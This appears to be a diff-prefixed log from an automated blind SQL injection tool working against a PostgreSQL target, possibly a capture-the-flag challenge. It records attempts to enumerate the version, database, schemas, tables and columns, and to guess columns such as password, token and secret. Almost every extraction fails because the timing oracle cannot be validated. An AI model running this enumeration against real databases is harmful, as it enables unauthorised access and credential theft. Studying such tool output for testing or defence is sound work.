+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err400/155B ok400/155B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT version()' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT version()...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT (json_build_object('v',version()))->>'v'" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT (json_build_object('v',version())...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT current_database()' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT current_database()...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT current_user' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT current_user...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(datname,',') FROM pg_database WHERE datist" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg(datname,',') FROM pg_d...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(nspname, ',' ORDER BY nspname) FROM pg_cat" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg(nspname, ',' ORDER BY ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT array_to_string(array_agg(nspname ORDER BY nspname),'" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT array_to_string(array_agg(nspname...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg((json_build_object('s',nspname))->>'s',','" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg((json_build_object('s'...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT array_to_string(array_agg(nspname),',') FROM pg_names" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT array_to_string(array_agg(nspname...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT datname FROM pg_database WHERE datistemplate=false AN' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT datname FROM pg_database WHERE da...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(table_name,',' ORDER BY table_name) FROM i" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg(table_name,',' ORDER B...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(relname, ',' ORDER BY relname) FROM pg_cat" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg(relname, ',' ORDER BY ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg((json_build_object('t',tablename))->>'t','" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg((json_build_object('t'...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[+] [Extract] Timing fallback oracle validated (true=False false=True)
+[+] [Extract] Length=1 (oracle=timing_fallback)
+[+] [BitwiseExtract] Extracting 1 chars (2 parallel, 8 bits each)...
+[+] [BitwiseExtract] [1/1] □
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT table_name FROM information_schema.tables WHERE table' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT table_name FROM information_schem...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [nofunc] per-item extraction succeeded for 'tables': □
+[+]   Tables (main): □
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(column_name,',' ORDER BY ordinal_position)" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg(column_name,',' ORDER ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(attname, ',' ORDER BY attnum) FROM pg_cata" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg(attname, ',' ORDER BY ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT column_name FROM information_schema.columns WHERE tab' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT column_name FROM information_sche...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] Dumping table: main.□
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(column_name,',' ORDER BY ordinal_position)" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg(column_name,',' ORDER ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(attname, ',' ORDER BY attnum) FROM pg_cata" (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT string_agg(attname, ',' ORDER BY ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT column_name FROM information_schema.columns WHERE tab' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT column_name FROM information_sche...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+]   Trying common column names: ['secret', 'flag', 'value', 'data', 'key', 'answer', 'password', 'token', 'code', 'hash', 'id', 'name', 'username', 'email']
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "secret" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "secret" FROM "main"."□" LIMIT 1 ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "secret" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "secret" FROM "main"."□" LIMIT 1 ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "flag" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "flag" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "flag" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "flag" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "value" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "value" FROM "main"."□" LIMIT 1 O...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "value" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "value" FROM "main"."□" LIMIT 1 O...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "data" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "data" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "data" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "data" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "key" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "key" FROM "main"."□" LIMIT 1 OFF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "key" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "key" FROM "main"."□" LIMIT 1 OFF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "answer" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "answer" FROM "main"."□" LIMIT 1 ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "answer" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "answer" FROM "main"."□" LIMIT 1 ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "password" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "password" FROM "main"."□" LIMIT ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "password" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "password" FROM "main"."□" LIMIT ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "token" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "token" FROM "main"."□" LIMIT 1 O...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "token" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "token" FROM "main"."□" LIMIT 1 O...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "code" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "code" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "code" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "code" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "hash" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "hash" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "hash" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "hash" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "id" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "id" FROM "main"."□" LIMIT 1 OFFS...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[+] [Extract] Timing fallback oracle validated (true=True false=False)
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "name" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "name" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "name" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "name" FROM "main"."□" LIMIT 1 OF...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "username" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "username" FROM "main"."□" LIMIT ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "username" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "username" FROM "main"."□" LIMIT ...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "email" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "email" FROM "main"."□" LIMIT 1 O...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[+] [Extract] Timing fallback oracle active (PostgreSQL, t=3.0s, thresh=1700ms)
